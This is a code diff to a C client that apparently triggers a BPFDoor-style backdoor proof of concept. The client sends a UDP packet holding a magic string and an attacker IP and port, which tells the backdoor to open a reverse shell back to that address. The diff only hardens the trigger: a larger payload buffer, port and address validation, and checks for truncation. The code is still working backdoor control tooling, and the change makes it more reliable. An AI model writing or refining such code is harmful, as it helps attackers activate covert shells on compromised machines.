@@ -17,20 +17,33 @@ int main (int argc, char *argv[])
 	int sock;
 
 	char *srv_ip = SERVER_IP;
-	char *srv_port = STR(REVERSE_SHELL_PORT);
-	char payload[32];
-	int payload_len = 32;
+	char *srv_port_str = STR(REVERSE_SHELL_PORT); // Rename to avoid confusion with integer port
+	char payload[128]; // Increased buffer size
+	int payload_buf_sz = sizeof(payload);
+	long srv_port_num; // Use long for strtol
 
 	if (argc >= 2) {
 		srv_ip = argv[1];
 	}
 	if (argc >= 3) {
-		srv_port = argv[2];
+		srv_port_str = argv[2];
+	}
+
+	// Validate srv_port_str
+	char *endptr;
+	srv_port_num = strtol(srv_port_str, &endptr, 10);
+	if (*endptr != '\0' || srv_port_num <= 0 || srv_port_num > 65535) {
+		fprintf(stderr, "error: invalid reverse shell port: %s\n", srv_port_str);
+		exit(1);
 	}
 
 	// build payload
-	payload_len = snprintf(payload, payload_len, "%s%s:%s", MAGIC_STR, srv_ip, srv_port);
-	payload_len += 1; // include null byte
+	int snprintf_res = snprintf(payload, payload_buf_sz, "%s%s:%ld", MAGIC_STR, srv_ip, srv_port_num);
+	if (snprintf_res < 0 || snprintf_res >= payload_buf_sz) {
+		fprintf(stderr, "error: payload creation failed or truncated\n");
+		exit(1);
+	}
+	int payload_len = snprintf_res + 1; // include null byte
 
 	if ((sock = socket (AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
 	{
@@ -43,7 +56,11 @@ int main (int argc, char *argv[])
 	
 	// bpfdoorpoc ip & port
 	sin.sin_port = htons (SERVER_PORT);
-	inet_aton (srv_ip, &sin.sin_addr);
+	// Use inet_pton instead of inet_aton
+	if (inet_pton(AF_INET, srv_ip, &sin.sin_addr) <= 0) {
+		fprintf(stderr, "error: invalid server IP address: %s\n", srv_ip);
+		exit(1);
+	}
 
 	fprintf(stderr, "Sending payload to %s:%i\n", srv_ip, SERVER_PORT);
 	
